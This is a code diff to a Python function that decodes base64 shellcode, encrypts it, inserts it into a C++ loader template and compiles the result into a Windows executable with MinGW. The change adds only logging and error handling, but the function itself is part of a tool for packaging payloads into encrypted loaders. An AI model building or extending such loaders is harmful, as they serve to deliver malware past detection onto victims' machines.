@@ -44,28 +44,43 @@ def generate_loader(shellcode_base64):
     """
     try:
         logging.info("Generating loader for shellcode...")
+        logging.info(f"Shellcode length: {len(shellcode_base64)}")
         
         # Create compiled directory if it doesn't exist
         os.makedirs(COMPILED_DIR, exist_ok=True)
         
         # Decode base64 shellcode
-        shellcode_bytes = base64.b64decode(shellcode_base64)
+        try:
+            shellcode_bytes = base64.b64decode(shellcode_base64)
+            logging.info(f"Decoded shellcode length: {len(shellcode_bytes)} bytes")
+        except Exception as e:
+            logging.error(f"Failed to decode base64 shellcode: {str(e)}")
+            return None
         
         # Encrypt the shellcode
-        encrypted_b64 = encrypt_shellcode(shellcode_bytes)
-        logging.info("Shellcode encrypted successfully")
+        try:
+            encrypted_b64 = encrypt_shellcode(shellcode_bytes)
+            logging.info(f"Encrypted shellcode length: {len(encrypted_b64)}")
+            logging.info("Shellcode encrypted successfully")
+        except Exception as e:
+            logging.error(f"Failed to encrypt shellcode: {str(e)}")
+            return None
         
         # Load template and replace placeholder with encrypted shellcode
-        with open(CPP_TEMPLATE, "r") as f:
-            template = f.read()
+        try:
+            with open(CPP_TEMPLATE, "r") as f:
+                template = f.read()
+                
+            loader_code = template.replace("###ENCRYPTED_SHELLCODE###", encrypted_b64)
             
-        loader_code = template.replace("###ENCRYPTED_SHELLCODE###", encrypted_b64)
-        
-        # Write the loader code to file
-        with open(OUTPUT_CPP, "w") as f:
-            f.write(loader_code)
-        
-        logging.info(f"Loader C++ code written to {OUTPUT_CPP}")
+            # Write the loader code to file
+            with open(OUTPUT_CPP, "w") as f:
+                f.write(loader_code)
+            
+            logging.info(f"Loader C++ code written to {OUTPUT_CPP}")
+        except Exception as e:
+            logging.error(f"Failed to generate loader source code: {str(e)}")
+            return None
         
         # Check if MinGW is installed
         if not check_mingw():
@@ -99,7 +114,8 @@ def generate_loader(shellcode_base64):
         )
         
         if result.returncode != 0:
-            logging.error(f"Compilation failed: {result.stderr.decode()}")
+            error_msg = result.stderr.decode()
+            logging.error(f"Compilation failed: {error_msg}")
             return None
             
         logging.info(f"Loader compiled successfully: {OUTPUT_EXE}")
